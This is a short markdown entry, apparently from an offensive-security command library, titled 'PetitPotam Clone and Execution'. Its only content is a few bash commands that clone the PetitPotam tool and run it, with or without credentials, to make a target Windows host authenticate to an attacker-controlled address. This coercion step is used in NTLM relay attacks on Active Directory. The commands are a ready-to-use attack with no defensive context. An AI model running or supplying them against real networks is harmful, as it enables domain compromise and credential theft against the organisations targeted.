---
id: 1f42ef5d-60ff-4cf0-bfa7-5f0b5d3fdff7
name: PetitPotam Clone and Execution
type: command
executor: bash
data: 'git clone https://github.com/topotam/PetitPotam

  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP

  python3 petitpotam.py -d '''' -u '''' -p '''' $ATTACKER_IP $TARGET_IP'
output: null
created_at: '2023-04-06T03:56:07.618854+00:00'
updated_at: '2023-04-10T20:36:05.391024+00:00'
---

# PetitPotam Clone and Execution

```bash
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
```


